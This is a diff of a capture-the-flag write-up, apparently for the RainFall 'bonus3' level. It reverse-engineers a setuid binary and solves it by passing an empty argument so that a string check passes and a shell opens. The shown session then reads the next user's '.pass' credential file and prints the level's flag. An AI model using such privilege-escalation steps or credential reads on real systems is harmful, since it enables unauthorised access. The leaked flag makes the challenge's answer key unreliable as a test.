@@ -1,19 +1,19 @@
 
-#### notes
-```
+### notes
+```c
 0x080484f4  main
 ```
 
-#### 0x08048529 : main() : disassembly
+### 0x08048529 : main() : disassembly
 ```c
 {
     int argc = ebp+0x8
     char **argv = ebp+12
     char *flagFile = esp+156 // ~0x9c
-    char *buffer[] = esp+24
+    char *buffer[156 - 24=132] = esp+24
 }
 ```
-_`<0> ==> <+9> : prepare stack frame for n function with size 160`_
+_**`<0> ==> <+8> : prepare stack frame for n function with size 160`**_
 ```c
 0x080484f4 <+0>:	push   ebp
 0x080484f5 <+1>:	mov    ebp,esp
@@ -74,10 +74,11 @@ fread(buffer, 1, 66, flagFile);
 0x08048584 <+144>:	call   0x8048430 <atoi@plt> //eax = atoi(argv[1]) 
 
 buffer[65] = 0 
-atoi(argv[1])
+eax = atoi(argv[1])
 ```
 ```c  
-0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+24],0 // [buffer+eax] ~ [buffer+atoi(argv[1])] ! buffer[atoi(argv[1]] = 0
+0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+24],0
+[buffer+eax] ~ [buffer+atoi(argv[1])] => buffer[atoi(argv[1]] = 0
 ```
 ```c
 0x0804858e <+154>:	lea    eax,[buffer]
@@ -139,9 +140,10 @@ return 0
 
 
 
-#### Code Prediction 
+### Code Prediction 
 ```c
 int main(int argc(ebp+0x8), char **argv(ebp+12)) {
+
     char *flagFile = esp+156 // ~0x9c
     char *buffer[132] = esp+24 // ~0x18 
     // we know the size of the buffer by calculating the gap between the flagFile and buffer 0x9c-0x18 = 156-24 = 132
@@ -149,15 +151,17 @@ int main(int argc(ebp+0x8), char **argv(ebp+12)) {
     flagFile = fopen("/home/user/end/.pass", "r")
     memset(buffer, 0, 132)
 
-    if (flagFile == 0 || arc != 2) {
+    if (flagFile == 0 || argc != 2) {
         return (-1);
     }
 
     if (argc == 2) {
         fread(buffer, 1, 66, flagFile);
         buffer[65] = 0 ;
+
         int nb = atoi(argv[1])
         buffer[nb] = 0;
+
         fread(&buffer[66], 1, 65, flagFile); 
         fclose(flagFile);
 
@@ -168,19 +172,62 @@ int main(int argc(ebp+0x8), char **argv(ebp+12)) {
             execl("/bin/sh", "sh", 0);
     }
     return (0);
-
-    
 }
 
 ```
-#### Process of the Exploit
+### Process of the Exploit
+the idea of the program is the following 
+- call atoi with first param and put value in nb
+- go to buffer and put \0 in the index nb (buffer[nb] = 0)
+- compare buffer to param1 (as string)
+- if equal execute shell
 
+- so buffer[atoi(param1)] == param1
+- when we send empty string to atoi it return 0
+    >  atoi("") = 0
+
+- result is this :
+    ```c
+    param1 = ""
+    nb = atoi(param1)
+    // nb == 0
+    buffer[nb]= 0
+    buffer[0] = 0
+    // buffer == ""
+    buffer == param1 ? yes
+    ```
 
 ---
-#### Solution :
+### Solution :
 
- 
+```shell
+bonus3@RainFall:~$ ./bonus3 ""
+$ pwd
+/home/user/bonus3
+$ whoami
+end
+$ cd /home/user/end  
+$ ls -la
+total 13
+dr-xr-x---+ 1 end  end     80 Sep 23  2015 .
+dr-x--x--x  1 root root   340 Sep 23  2015 ..
+-rw-r--r--  1 end  end    220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 end  end   3489 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 end  users   26 Sep 23  2015 end
+-r--r-----+ 1 end  end     65 Sep 23  2015 .pass
+-rw-r--r--  1 end  end    675 Apr  3  2012 .profile
+$ cat .pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$ su end
+Password: 
+end@RainFall:~$ ls
+end
+end@RainFall:~$ cat end 
+Congratulations graduate!
+end@RainFall:~$ 
+```
 
+**`flag : 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`**|
 ---
 
  
